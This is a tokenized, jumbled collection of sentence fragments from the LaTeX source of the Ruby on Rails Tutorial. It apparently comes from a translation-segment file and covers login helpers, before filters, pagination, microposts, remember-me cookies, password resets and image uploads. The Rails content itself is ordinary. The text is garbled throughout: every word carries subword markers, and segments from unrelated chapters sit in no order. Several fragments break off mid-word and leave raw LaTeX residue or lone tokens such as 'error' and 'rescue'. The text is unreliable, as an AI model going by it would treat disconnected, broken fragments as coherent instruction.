▁The ▁login ▁form ▁after ▁try ing ▁to ▁access ▁a ▁ protected ▁page .
▁This ▁is ▁easy ▁using ▁the ▁\ k ode { log \_ in \_ as } ▁helper ▁ developed ▁in ▁Section ~\ ref { sec : remember _ tests } ▁( Listing ~\ ref { code : test _ helper _ log _ in }), ▁as ▁show n ▁in ▁Listing ~\ ref { code : edit _ tests _ logged _ in }.
▁( We ▁could ▁eliminate ▁some ▁duplication ▁by ▁ putting ▁the ▁test ▁login ▁in ▁the ▁\ k ode { setup } ▁method ▁of ▁Listing ~\ ref { code : edit _ tests _ logged _ in }, ▁but ▁in ▁Section ~\ ref { sec : friendly _ forwarding } ▁we ' ll ▁change ▁one ▁of ▁the ▁tests ▁to ▁visit ▁the ▁edit ▁page ▁\ emph { before } ▁logging ▁in , ▁which ▁is n ' t ▁possible ▁if ▁the ▁login ▁step ▁happens ▁during ▁the ▁test ▁setup .)
▁ Comment ing ▁out ▁the ▁before ▁filter ▁to ▁test ▁our ▁security ▁model .
▁To ▁get ▁it ▁to ▁\ passing , ▁just ▁uncomment ▁the ▁before ▁filter ▁( Listing ~\ ref { code : un comment ed _ before _ filter }).
▁With ▁that , ▁our ▁test ▁suite ▁should ▁be ▁\ passing :
▁By ▁using ▁the ▁\ k ode { log \_ in \_ as } ▁method ▁defined ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in }, ▁we ▁can ▁test ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions ▁as ▁in ▁Listing ~\ ref { code : edit _ update _ wrong _ user _ tests }.
▁Note ▁that ▁we ▁expect ▁to ▁redirect ▁users ▁to ▁the ▁root ▁path ▁instead ▁of ▁the ▁login ▁path ▁because ▁a ▁user ▁try ing ▁to ▁edit ▁a ▁different ▁user ▁would ▁already ▁be ▁logged ▁in .
▁At ▁this ▁point , ▁our ▁test ▁suite ▁should ▁be ▁\ passing :
▁Here ▁the ▁storage ▁ mechanism ▁for ▁the ▁forwarding ▁URL ▁is ▁the ▁same ▁\ k ode { session } ▁facilit y ▁we ▁used ▁in ▁Section ~\ ref { sec : a _ working _ log _ in _ method } ▁to ▁log ▁the ▁user ▁in .
▁The ▁\ k ode { store \_ location } ▁method ▁in ▁Listing ~\ ref { code : friendly _ forwarding _ code } ▁put s ▁the ▁request ed ▁URL ▁in ▁the ▁\ k ode { session } ▁variable ▁under ▁the ▁key ▁\ k ode { : forwarding \_ url }, ▁but ▁only ▁for ▁a ▁\ k ode { GET } ▁request .
▁As ▁usual , ▁it ' s ▁a ▁good ▁idea ▁to ▁verify ▁that ▁the ▁test ▁suite ▁is ▁\ passing \ ▁before ▁proceeding :
▁With ▁that , ▁the ▁users ▁index ▁is ▁fully ▁functional , ▁with ▁all ▁tests ▁\ passing :
▁The ▁users ▁index ▁page ▁with ▁only ▁one ▁user .
▁The ▁users ▁index ▁page ▁with ▁100 ▁sample ▁users .
▁P age ▁2 ▁of ▁the ▁users ▁index .
▁A ▁test ▁of ▁the ▁users ▁index , ▁including ▁pagination .
▁The ▁result ▁should ▁be ▁a ▁\ passing \ ▁test ▁suite :
▁The ▁first ▁step ▁in ▁our ▁refactoring ▁is ▁to ▁replace ▁the ▁user ~\ k ode { li } ▁from ▁Listing ~\ ref { code : will _ paginate _ index _ view } ▁with ▁a ▁\ k ode { render } ▁call ▁( Listing ~\ ref { code : index _ view _ first _ refactoring }).
▁This ▁is ▁a ▁defin ite ▁improve ment , ▁but ▁we ▁can ▁do ▁even ▁better : ▁we ▁can ▁call ▁\ k ode { render } ▁\ emph { directly } ▁on ▁the ▁\ k ode {@ users } ▁variable ▁( Listing ~\ ref { code : index _ final _ refactoring }).
▁As ▁with ▁any ▁refactoring , ▁you ▁should ▁verify ▁that ▁the ▁test ▁suite ▁is ▁ still ▁\ passing \ ▁after ▁changing ▁the ▁application ▁code :
▁The ▁User ▁model ▁with ▁an ▁added ▁\ k ode { admin } ▁boolean ▁attribute .
▁Note ▁that ▁we ' ve ▁added ▁the ▁argument ▁\ k ode { default : ▁false } ▁to ▁\ k ode { add \_ column } ▁in ▁Listing ~\ ref { code : admin _ migration }, ▁which ▁means ▁that ▁users ▁will ▁\ emph { not } ▁be ▁administrator s ▁by ▁default .
▁At ▁this ▁point , ▁our ▁deletion ▁code ▁is ▁well - test ed , ▁and ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁Ruby ▁on ▁Rails ▁Tutorial
▁The ▁\ k ode { current _ user ? }
▁We ’ ve ▁also ▁wrapp ed ▁each ▁link ▁inside ▁an ▁\ text tt { if } ▁statement ▁so ▁that ▁only ▁admin s ▁can ▁see ▁them .
▁The ▁Micropost ▁data ▁model .
▁The ▁\ k ode { belongs \_ to } ▁relationship ▁between ▁a ▁micropost ▁and ▁its ▁ associated ▁user .
▁The ▁\ k ode { has \_ many } ▁relationship ▁between ▁a ▁user ▁and ▁its ▁microposts .
▁A ▁summary ▁of ▁user / micropost ▁association ▁methods .
▁With ▁the ▁association ▁thus ▁made , ▁we ▁can ▁update ▁the ▁\ k ode { setup } ▁method ▁in ▁Listing ~\ ref { code : micropost _ validity _ test } ▁with ▁the ▁idiomatic ally ▁correct ▁way ▁to ▁build ▁a ▁new ▁micropost , ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ validity _ test _ id io ma tic }.
▁If ▁the ▁code ▁in ▁Listing ~\ ref { code : micropost _ dependency } ▁is ▁working ▁correctly , ▁the ▁test ▁suite ▁should ▁ still ▁be ▁\ passing :
▁A ▁mockup ▁of ▁a ▁profile ▁page ▁with ▁microposts .
▁Note ▁the ▁use ▁of ▁\ k ode { if ▁@ user . microposts . any ?}\ ▁( a ▁construction ▁we ▁saw ▁before ▁in ▁Listing ~\ ref { code : errors _ partial }), ▁which ▁make s ▁sure ▁that ▁an ▁empty ▁list ▁won ' t ▁be ▁displayed ▁when ▁the ▁user ▁has ▁no ▁microposts .
▁The ▁user ▁profile ▁page ▁with ▁code ▁for ▁microposts --- but ▁no ▁microposts .
▁The ▁user ▁profile ▁with ▁un style d ▁microposts .
▁In ▁all ▁three ▁cases , ▁ ob serve ▁that ▁each ▁micropost ▁display ▁indicates ▁the ▁time ▁since ▁it ▁was ▁created ▁( e . g . , ▁`` Post ed ▁1 ▁ minute ▁ ago . '') ; ▁this ▁is ▁the ▁work ▁of ▁the ▁\ k ode { time \_ ago \_ in \_ words } ▁method ▁from ▁Listing ~\ ref { code : micropost _ partial }.
▁Note ▁the ▁use ▁of ▁the ▁\ k ode { full \_ title } ▁helper ▁from ▁Listing ~\ ref { code : title _ helper } ▁to ▁test ▁the ▁page ' s ▁title , ▁which ▁we ▁gain ▁access ▁to ▁by ▁including ▁the ▁Application ▁ Helper ▁module ▁into ▁the ▁test
▁If ▁you ' d ▁like ▁to ▁refactor ▁other ▁tests ▁to ▁use ▁\ k ode { full \_ title } ▁( such ▁as ▁those ▁in ▁Listing ~\ ref { code : base _ title _ test }), ▁you ▁should ▁include ▁the ▁Application ▁ Helper ▁in ▁\ k ode { test \_ helper . rb } ▁instead .
▁A ▁test ▁for ▁the ▁user ▁profile .
▁Of ▁course , ▁this ▁simplicity ▁is ▁a ▁sign ▁of ▁being ▁\ emph { more } ▁advanced , ▁not ▁less --- we ' ve ▁come ▁a ▁long ▁way ▁since ▁our ▁re li ance ▁on ▁scaffolding ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁and ▁we ▁no ▁longer ▁need ▁most ▁of ▁its ▁complex ity .
▁RESTful ▁routes ▁provided ▁by ▁the ▁Microposts ▁resource ▁in ▁Listing ~\ ref { code : microposts _ resource }.
▁A ▁mockup ▁of ▁the ▁Home ▁page ▁with ▁a ▁form ▁for ▁creating ▁microposts .
▁as ▁seen ▁in ▁Listing ~\ ref { code : microposts _ create _ action }.
▁In ▁the ▁present ▁case , ▁though , ▁say ing ▁`` 1 ▁microposts '' ▁is ▁ungrammatical , ▁so ▁we ▁arrange ▁to ▁display ▁`` 1 ▁micropost '' ▁and ▁`` 2 ▁microposts '' ▁using ▁the ▁\ k ode { pluralize } ▁method ▁we ▁saw ▁in ▁Section ~\ ref { sec : signup _ error _ messages }.
▁The ▁Home ▁page ▁with ▁a ▁new ▁micropost ▁form .
▁The ▁Home ▁page ▁with ▁a ▁form ▁error .
▁It ▁would ▁be ▁far ▁better ▁to ▁have ▁a ▁\ emph { feed } ▁of ▁microposts ▁that ▁includes ▁the ▁user ' s ▁own ▁posts , ▁as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : proto _ feed _ mockup }.
▁A ▁mockup ▁of ▁the ▁Home ▁page ▁with ▁a ▁proto - feed .
▁We ' ve ▁used ▁the ▁code ▁in ▁Listing ~\ ref { code : proto _ status _ feed } ▁instead ▁because ▁it ▁general ize s ▁much ▁more ▁natural ly ▁to ▁the ▁full ▁status ▁feed ▁needed ▁in ▁Chapter ~\ ref { cha : following _ users }.
▁The ▁Home ▁page ▁with ▁a ▁proto - feed .
▁The ▁Home ▁page ▁after ▁creating ▁a ▁new ▁micropost .
▁A ▁mockup ▁of ▁the ▁proto - feed ▁with ▁micropost ▁delete ▁links .
▁Note ▁that ▁the ▁\ k ode { destroy } ▁method ▁in ▁Listing ~\ ref { code : microposts _ destroy _ action } ▁redirect s ▁to ▁the ▁URL
▁The ▁Home ▁page ▁after ▁deleting ▁the ▁second - most - recent ▁micropost .
▁Because ▁we ▁wrote ▁working ▁application ▁code ▁first , ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁On ▁some ▁systems , ▁you ▁may ▁need ▁to ▁restart ▁the ▁Rails ▁server ▁at ▁this ▁point ▁to ▁keep ▁the ▁test ▁suite ▁\ passing .
▁The ▁valid ▁format s ▁consist ▁of ▁the ▁\ href { https :// en . wiki p edia . org / wiki / Internet _ m edia _ type }{ M I ME ▁types } ▁accepted ▁by ▁the ▁validation ▁in ▁Listing ~\ ref { code : validate _ picture _ format }.
▁The ▁image ▁ uploader ▁ developed ▁in ▁Section ~\ ref { sec : image _ resizing } ▁is ▁good ▁enough ▁for ▁development , ▁but ▁( as ▁seen ▁in ▁the ▁\ k ode { st or age ▁: file } ▁line ▁in ▁Listing ~\ ref { code : image _ uploader _ resizing }) ▁it ▁uses ▁the ▁local ▁file system ▁for ▁storing ▁the ▁images , ▁which ▁is n ' t ▁a ▁good ▁practice ▁in ▁production
▁To ▁configure ▁our ▁application ▁to ▁use ▁cloud ▁storage ▁in ▁production , ▁we ' ll ▁use ▁the ▁\ text tt { f o g } ▁gem , ▁as ▁show n ▁in ▁Listing ~\ ref { code : image _ uploader _ production }.
▁The ▁\ k ode { current \_ user ? }
▁error
▁This ▁is ▁the ▁first ▁application ▁for
▁the < n >[ * Ruby ▁on ▁Rails ▁Tutorial * ]( http :// railstutorial . j p / )
▁( It ' s ▁ probably ▁a ▁good ▁idea ▁to ▁write ▁a ▁test ▁for ▁the ▁flash ▁as ▁well , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ the _ flash }).)
▁Because ▁we ' ll ▁need ▁forms ▁both ▁for ▁creating ▁new ▁password ▁resets ▁( F igure ~\ ref { fig : forgot _ password _ form _ mockup }) ▁and ▁for ▁updating ▁them ▁by ▁changing ▁the ▁password ▁in ▁the ▁User ▁model ▁( F igure ~\ ref { fig : reset _ password _ form _ mockup }), ▁we ▁need ▁routes ▁for ▁\ k ode { new }, ▁\ k ode { create }, ▁\ k ode { edit }, ▁and ▁\ k ode { update }.
▁As ▁you ▁proceed ▁through ▁this ▁tutorial , ▁in ▁all ▁like li h ood ▁you ▁will ▁ o cc as ion ally ▁be ▁tr ip ped ▁up ▁by ▁things ▁not ▁immediately ▁working ▁as ▁expected .
▁A lthough ▁some ▁particular ly ▁trick y ▁steps ▁are ▁explicitly ▁highlight ed ▁in ▁the ▁text , ▁it ▁is ▁i mp ossible ▁to ▁an tic ip ate ▁all ▁the ▁things ▁that ▁can ▁go ▁wrong .
▁I ▁recommend ▁you ▁ em b ra ce ▁these ▁in evi table ▁ st um b l ing ▁blocks ▁as ▁opportunit ies ▁to ▁work ▁on ▁i mprov ing ▁your ▁technical ▁sophistication .
▁The ▁code ▁in ▁Listing ~\ ref { code : user _ index _ view } ▁uses ▁the ▁result ▁of ▁Listing ~\ ref { code : gravatar _ option _ redux } ▁from ▁Section ~\ ref { sec : signup _ exercises }, ▁which ▁allows ▁us ▁to ▁pass ▁an ▁option ▁to ▁the ▁Gravatar ▁helper ▁specify ing ▁a ▁size ▁other ▁than ▁the ▁default .
▁ n t ▁ prerequisites ▁( es pecially ▁\ ler , ▁\ le s , ▁and ▁\ le ra ). < n >< n > ▁\ section { S how ing ▁users } ▁% ▁( fold )< n > ▁\ label { sec : showing _ users }< n >< n >
▁te }< n >< n > ▁% ▁subsection ▁rails _ environments ▁( end )< n >< n > ▁\ subsection { A ▁Users ▁resource } ▁% ▁( fold )< n > ▁\ label { sec : a _ users _ resource }< n >< n >
▁te }< n >< n > ▁% ▁subsection ▁a _ users _ resource ▁( end )< n >< n >\ subsection { Debugger } ▁% ▁( fold )< n >\ label { sec : debugger }< n >< n >
▁b section ▁ debugger ▁( end )< n >< n > ▁\ subsection { A ▁Gravatar ▁image ▁and ▁a ▁sidebar } ▁% ▁( fold )< n > ▁\ label { sec : a _ gravatar _ image }< n >< n >
▁i ce ? < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - d 0 b b f e ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁using _ form _ for ▁( end )< n >< n > ▁\ subsection { Sign up ▁form ▁HTML } ▁% ▁( fold )< n > ▁\ label { sec : the _ form _ html }< n >< n >
▁ umerate }< n >< n > ▁% ▁subsection ▁the _ form _ html ▁( end )< n >< n > ▁\ section { U n successful ▁signup s } ▁% ▁( fold )< n > ▁\ label { sec : unsuccessful _ signup s }< n >< n >
▁te }< n >< n > ▁% ▁subsection ▁the _ f in is h ed _ signup _ form ▁( end )< n >< n > ▁\ subsection { The ▁flash } ▁% ▁( fold )< n > ▁\ label { sec : the _ flash }< n >< n >
▁< n >< n > ▁% ▁subsection ▁the _ first _ signup ▁( end )< n >< n >\ subsection { A ▁test ▁for ▁valid ▁submission } ▁% ▁( fold )< n >\ label { sec : a _ test _ for _ valid _ submission }< n >< n >
▁Co m m it
▁ ActionView :: Missing Template :
▁As ▁with ▁model ▁inheritance , ▁both ▁the ▁Users ▁and ▁Microposts ▁controllers ▁gain ▁a ▁large ▁amount ▁of ▁functionality ▁by ▁inherit ing ▁from ▁a ▁base ▁class ▁( in ▁this ▁case , ▁\ k ode { ActionController :: Base }), ▁including ▁the ▁ability ▁to ▁manipulate ▁model ▁objects , ▁filter ▁in b ound ▁HTTP ▁requests , ▁and ▁render ▁views ▁as ▁HTML . ▁S ince ▁all ▁Rails ▁controllers ▁inherit ▁from ▁\ k ode { Application Controller }, ▁rules ▁defined ▁in ▁the ▁Application ▁controller ▁automatically ▁apply ▁to ▁every ▁action ▁in ▁the ▁application .
▁The ▁result ▁appears ▁in ▁F igure ~\ ref { fig : sqlite _ database _ browser }) ; ▁compare ▁with ▁the ▁diagram ▁in ▁F igure ~\ ref { fig : user _ model _ initial }.
▁I ▁thus ▁have ▁a ▁ strong ▁p reference ▁for ▁including ▁multiple ▁assertion s ▁in ▁a ▁test , ▁rely ing ▁on ▁Ruby ▁( via ▁ MiniTest ) ▁to ▁tell ▁me ▁the ▁exact ▁lines ▁of ▁any ▁failed ▁assertion s .
▁As ▁with ▁`` Ctrl - C '' , ▁the ▁convention ▁is ▁to ▁write ▁`` Ctrl - D '' ▁even ▁though ▁it ' s ▁really ▁`` Ctrl - d ''.
▁( Includ ing ▁\ k ode { new } ▁actually ▁generates ▁\ emph { views } ▁as ▁well , ▁which ▁is ▁why ▁we ▁don ' t ▁include ▁actions ▁like ▁\ k ode { create } ▁and ▁\ k ode { delete } ▁that ▁don ' t ▁correspond ▁to ▁views .)
▁in ▁Listing ~\ ref { code : log _ out _ with _ forget }.
▁The ▁second ▁subtlety ▁is ▁that ▁a ▁user ▁could ▁be ▁logged ▁in ▁( and ▁remember ed ) ▁in ▁multiple ▁browsers , ▁such ▁as ▁Chrome ▁and ▁Firefox , ▁which ▁cause s ▁a ▁problem ▁if ▁the ▁user ▁log s ▁out ▁in ▁one ▁browser ▁but ▁not ▁the ▁other
▁In ▁contrast , ▁inside ▁Chrome ▁the ▁\ k ode { user \_ id } ▁cookie ▁has n ' t ▁been ▁deleted , ▁so ▁\ k ode { user \_ id } ▁will ▁be ▁\ k ode { true } ▁in ▁a ▁boolean ▁context ▁and ▁the ▁corresponding ▁user ▁will ▁be ▁found ▁in ▁the ▁database :
▁Use ▁of ▁the ▁Rails ▁`` default ▁stack '' , ▁including ▁the ▁built - in ▁ MiniTest ▁testing ▁framework
▁There ▁are ▁no ▁form al ▁ prerequisites ▁to ▁this ▁book --- the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁contains ▁integrat ed ▁tutorial s ▁not ▁only ▁for ▁Rails , ▁but ▁also ▁for ▁the ▁under ly ing ▁Ruby ▁language , ▁the ▁default ▁Rails ▁testing ▁framework ▁( MiniTest ), ▁the ▁Unix ▁command ▁line , ▁\ href { http :// en . wiki p edia . org / wiki / HTML }{ HTML }, ▁\ href { http :// en . wiki p edia . org / wiki / CSS }{ CSS }, ▁a ▁small ▁amount ▁of ▁\ href { http :// en . wiki p edia . org / wiki / JavaScript }{ JavaScript }, ▁and ▁even ▁a ▁little ▁\ href { http :// en . wiki p edia . org / wiki / SQL }{ SQL }.
▁( Includ ing ▁\ k ode { new } ▁actually ▁generates ▁\ emph { views } ▁as ▁well , ▁which ▁is ▁why ▁we ▁don ' t ▁include ▁actions ▁like ▁\ k ode { create } ▁and ▁\ k ode { delete } ▁that ▁don ' t ▁correspond ▁to ▁views .)
▁Note ▁that ▁Listing ~\ ref { code : rails _ command } ▁explicitly ▁includes ▁the ▁Rails ▁version ▁number ▁(\ k ode { \_ 4.2.0 \_ }) ▁as ▁part ▁of ▁the ▁command .
▁It ' s ▁really ▁`` Ctrl - c '' --- the re ' s ▁no ▁need ▁to ▁hold ▁down ▁the ▁S h if t ▁key ▁to ▁get ▁a ▁c api t al ▁`` C '' --- but ▁for ▁some ▁reason ▁it ' s ▁always ▁written ▁as ▁`` Ctrl - C ''.
▁Git ▁is ▁a ▁large ▁subject , ▁and ▁we ' ll ▁only ▁be ▁scratch ing ▁the ▁ s ur fa ce ▁in ▁this ▁book , ▁but ▁there ▁are ▁many ▁good ▁free ▁resources ▁online ; ▁I ▁es pecially ▁recommend ▁\ href { https :// co n f l u ence . at la s s i an . com / display / B I T B U C K E T / C l one + your + G it + repository + and + add + source + file s }{ B it b uck et ▁10 1 } ▁for ▁a ▁short ▁ overview ▁and ▁\ href { http :// git - sc m . com / book }{\ emph { Pro ▁Git } } ▁by ▁S co tt ▁C ha co n ▁for ▁a ▁book - length ▁introduction .
▁in ▁Listing ~\ ref { code : remember _ me _ ternary }.
▁The ▁\ k ode { followed } ▁association ▁is n ' t ▁actually ▁needed ▁un til ▁Section ~\ ref { sec : followers }, ▁but ▁the ▁parallel ▁follower / followed ▁structure ▁is ▁clear er ▁if ▁we ▁implement ▁them ▁both ▁at ▁the ▁same ▁time .
▁The ▁fixtures ▁in ▁Listing ~\ ref { code : relationships _ fixtures } ▁first ▁arrange ▁for ▁ Michael ▁to ▁follow ▁L an a ▁and ▁M all or y , ▁and ▁the n ▁arrange ▁for ▁ Michael ▁to ▁be ▁followed ▁by ▁L an a ▁and ▁A r ch er .
▁as ▁show n ▁in ▁Listing ~\ ref { code : gitignore _ upload s }.
▁(\ emph { Note } : ▁If ▁you ▁complete d ▁the ▁exercise ▁corresponding ▁to ▁Listing ~\ ref { code : base _ title _ test }, ▁you ▁should ▁re t a in ▁the ▁\ k ode { setup } ▁method ▁defin ing ▁the ▁\ k ode {@ base \_ title } ▁variable .)
▁It ' s ▁worth ▁noting ▁that ▁the ▁\ k ode { nil } ▁object ▁is ▁special , ▁in ▁that ▁it ▁is ▁the ▁\ emph { only } ▁Ruby ▁object ▁that ▁is ▁false ▁in ▁a ▁boolean ▁context , ▁a part ▁from ▁\ k ode { false } ▁itself :
▁Next , ▁why ▁does ▁the ▁\ k ode { data - turbolinks - t rack } ▁key / value ▁pair ▁use ▁the ▁old - style ▁h ashrocket ▁syntax ?
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ order _ test }.
▁( This ▁is ▁our ▁first ▁example ▁of ▁the ▁not ion ▁of ▁\ emph { scope }.
▁in ▁Listing ~\ ref { code : micropost _ order ing }.
▁If ▁you ▁wait ▁a ▁couple ▁minutes ▁and ▁reload ▁the ▁pages , ▁you ' ll ▁see ▁how ▁the ▁text ▁get s ▁automatically ▁updated ▁base d ▁on ▁the ▁new ▁time .
▁in ▁Listing ~\ ref { code : microposts _ controller _ access _ control }.
▁As ▁seen ▁in ▁Listing ~\ ref { code : mail _ account _ activation }, ▁the ▁\ k ode { mail } ▁method ▁also ▁take s ▁a ▁\ k ode { subject } ▁key , ▁who se ▁value ▁is ▁used ▁as ▁the ▁email ' s ▁subject ▁line .
▁# ▁This ▁is ▁pre li m in ary .
▁See ▁" Follow ing ▁users " ▁for ▁the ▁full ▁implementation .
▁After ▁restart ing ▁the ▁development ▁server ▁to ▁activate ▁the ▁configuration ▁in ▁Listing ~\ ref { code : development _ email _ settings }, ▁we ▁next ▁need ▁to ▁update ▁the ▁User ▁mailer ▁\ emph { preview ▁file }, ▁which ▁was ▁automatically ▁generated ▁in ▁Section ~\ ref { sec : account _ activation s _ resource }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s }.
▁There ▁is ▁one ▁subtlety , ▁though : ▁on ▁\ emph { failed } ▁micropost ▁submission , ▁the ▁Home ▁page ▁expect s ▁an ▁\ k ode {@ feed \_ item s } ▁instance ▁variable , ▁so ▁failed ▁submission s ▁current ly ▁break ▁( as ▁you ▁should ▁be ▁able ▁to ▁verify ▁by ▁running ▁your ▁test ▁suite ).
▁The ▁test ▁appears ▁in ▁Listing ~\ ref { code : micropost _ interface _ test }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : generalized _ current _ user }.
▁The ▁valid ▁format s ▁consist ▁of ▁the ▁\ href { https :// en . wiki p edia . org / wiki / Internet _ m edia _ type }{ M I ME ▁types } ▁accepted ▁by ▁the ▁validation ▁in ▁Listing ~\ ref { code : micropost _ model _ image _ validation }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : new _ password _ reset }
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset }.
▁in ▁\ line break ▁Listing ~\ ref { code : generalized _ authenticated _ p }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ edit _ action }.
▁in ▁Listing ~\ ref { code : sessions _ resource }.
▁/ sessions
▁create ▁a ▁new ▁session
▁( A ▁second ▁option ▁is ▁to ▁use ▁\ k ode { form \_ tag } ▁in ▁place ▁of ▁\ k ode { form \_ for } ; ▁this ▁m ight ▁be ▁even ▁more ▁idiomatic ally ▁correct ▁Rails , ▁but ▁it ▁has ▁less ▁in ▁common ▁with ▁the ▁signup ▁form , ▁and ▁at ▁this ▁stage ▁I ▁want ▁to ▁emphasize ▁the ▁parallel ▁structure .
▁in ▁Listing ~\ ref { code : login _ form _ html }.
▁< div >
▁Recall ing ▁that ▁\ k ode { authenticate } ▁returns ▁\ k ode { false } ▁for ▁an ▁invalid ▁authentication ▁( Section ~\ ref { sec : creating _ and _ authenticating _ a _ user }), ▁our ▁strategy ▁for ▁user ▁login ▁can ▁be ▁summariz ed ▁as ▁show n ▁in ▁Listing ~\ ref { code : find _ authenticate _ user }.
▁Because ▁of ▁the ▁flash ▁message ▁display ▁in ▁the ▁site ▁layout ▁( Listing ~\ ref { code : layout _ flash }), ▁the ▁\ k ode { flash [: danger ]} ▁message ▁automatically ▁get s ▁displayed ; ▁because ▁of ▁the ▁Bootstrap ▁CSS , ▁it ▁automatically ▁get s ▁nice ▁styling ▁( F igure ~\ ref { fig : failed _ login _ flash }).
▁With ▁the ▁\ k ode { log \_ in } ▁method ▁defined ▁in ▁Listing ~\ ref { code : log _ in _ success }, ▁we ' re ▁now ▁ready ▁to ▁complete ▁the ▁session ▁\ k ode { create } ▁action ▁by ▁logging ▁the ▁user ▁in ▁and ▁redirect ing ▁to ▁the ▁user ' s ▁profile ▁page .
▁F inally , ▁we ' ll ▁add ▁a ▁profile ▁link ▁as ▁follows :
▁as ▁show n ▁in ▁Listing ~\ ref { code : layout _ login _ logout _ links }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : destroy _ session }
▁in ▁Listing ~\ ref { code : add _ remember _ digest _ to _ users }.
▁where ▁\ k ode { cookies . signed [: user \_ id ]} ▁automatically ▁ de crypt s ▁the ▁user ▁id ▁cookie .
▁Of ▁course , ▁\ k ode { cookies } ▁is n ' t ▁\ emph { re ally } ▁a ▁hash , ▁since ▁assign ing ▁to ▁\ k ode { cookies } ▁actually ▁\ emph { save s } ▁a ▁piece ▁of ▁text ▁on ▁the ▁browser , ▁but ▁part ▁of ▁the ▁be a u t y ▁of ▁Rails ▁is ▁that ▁it ▁let s ▁you ▁ignore ▁that ▁detail ▁and ▁con c ent r ate ▁on ▁writing ▁the ▁application .
▁In ▁the ▁course ▁of ▁developing ▁the ▁core ▁sample ▁application , ▁we ' ve ▁now ▁ en counter ed ▁four ▁resources --- users , ▁sessions , ▁account ▁activation s , ▁and ▁password ▁resets --- but ▁only ▁the ▁first ▁of ▁these ▁is ▁back ed ▁by ▁an ▁Active ▁Record ▁model ▁with ▁a ▁table ▁in ▁the ▁database .
▁Using ▁the ▁\ k ode { belongs \_ to } / \ k ode { has \_ many } ▁association ▁defined ▁in ▁this ▁section , ▁Rails ▁construct s ▁the ▁methods ▁show n ▁in ▁Table ~\ ref { table : association _ methods }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : log _ out _ with _ forget }.
▁U nfortunately , ▁this ▁orders ▁the ▁results ▁in ▁\ emph { as c end ing } ▁order ▁from ▁small est ▁to ▁big g est , ▁which ▁means ▁that ▁the ▁old est ▁microposts ▁come ▁out ▁first .
▁In ▁the ▁present ▁case , ▁this ▁function ▁is
▁in ▁Listing ~\ ref { code : user _ logout _ test }.
▁Ou r ▁plan ▁is ▁to ▁display ▁the ▁microposts ▁for ▁each ▁user ▁on ▁their ▁respective ▁profile ▁page ▁(\ k ode { show . html . erb }), ▁together ▁with ▁a ▁running ▁count ▁of ▁how ▁many ▁microposts ▁they ' ve ▁made .
▁We ' ll ▁define ▁an ▁analogous ▁\ k ode { \_ micropost . html . erb } ▁partial ▁so ▁that ▁we ▁can ▁use ▁the ▁same ▁technique ▁on ▁a ▁collection ▁of ▁microposts ▁as ▁follows :
▁as ▁show n ▁in ▁Listing ~\ ref { code : branch _ no _ raise }.
▁in ▁Listing ~\ ref { code : remember _ method }.
▁As ▁indicate d ▁in ▁Section ~\ ref { sec : remember _ me _ checkbox }, ▁as ▁the ▁application ▁is ▁current ly ▁design ed ▁there ' s ▁no ▁way ▁to ▁access ▁the ▁virtual ▁\ k ode { remember \_ token } ▁attribute ▁in ▁the ▁integration ▁test ▁in ▁Listing ~\ ref { code : remember _ me _ test }.
▁in ▁Listing ~\ ref { code : login _ create _ user _ instance } ▁and
▁Note ▁that ▁we ▁have n ' t ▁restrict ed ▁the ▁actions ▁the ▁before ▁filter ▁applies ▁to ▁since ▁it ▁applies ▁to ▁them ▁both ▁by ▁default .
▁As ▁with ▁the ▁Users ▁resource , ▁we ' ll ▁use ▁an ▁integration ▁test :
▁Ou r ▁strategy ▁for ▁handling ▁account ▁activation ▁parallel s ▁user ▁login ▁( Section ~\ ref { sec : logging _ in }) ▁and ▁es pecially ▁remember ing ▁users ▁( Section ~\ ref { sec : remember _ me }).
▁as ▁show n ▁in ▁Listing ~\ ref { code : activation _ digest _ test }.
▁in ▁Listing ~\ ref { code : generated _ account _ activation _ view _ text } ▁and
▁The ▁feed ▁item ▁partial ▁with ▁added ▁delete ▁link .
▁In ▁this ▁case , ▁we ▁use ▁\ k ode { find \_ by } ▁instead ▁of ▁\ k ode { find } ▁because ▁the ▁latter ▁raise s ▁an ▁exception ▁when ▁the ▁micropost ▁does n ' t ▁exist ▁instead ▁of ▁return ing ▁\ k ode { nil }.
▁By ▁the ▁way , ▁if ▁you ' re ▁com for table ▁with ▁exception s ▁in ▁Ruby , ▁you ▁could ▁also ▁write ▁the ▁\ k ode { correct \_ user } ▁filter ▁like ▁this :
▁rescue
▁It ▁m ight ▁occur ▁to ▁you ▁that ▁we ▁could ▁implement ▁the ▁\ k ode { correct \_ user } ▁filter ▁using ▁the ▁\ k ode { Micropost } ▁model ▁directly , ▁like ▁this :
▁in ▁Listing ~\ ref { code : development _ email _ settings }.
▁To ▁get ▁started , ▁we ▁need ▁to ▁include ▁the ▁\ text tt { carrierwave } ▁gem ▁in ▁the ▁\ k ode { Gemfile } ▁( Listing ~\ ref { code : gemfile _ carrierwave }).
▁ Adding ▁ CarrierWave ▁to ▁the ▁\ k ode { Gemfile }.
▁ Base d ▁on ▁this ▁discussion ▁of ▁\ k ode { s end }, ▁we ▁can ▁re write ▁the ▁current ▁\ k ode { authenticated ?}\ ▁method ▁as ▁follows :
▁App ly ing ▁this ▁discussion ▁to ▁the ▁User ▁model ▁yields ▁the ▁ generalized ▁\ k ode { authenticated ?}\ ▁method ▁show n ▁in ▁Listing ~\ ref { code : generalized _ authenticated _ p }.
▁For ▁reference , ▁the ▁final ▁\ k ode { Gemfile } ▁is ▁show n ▁in ▁Listing ~\ ref { code : final _ gemfile }.
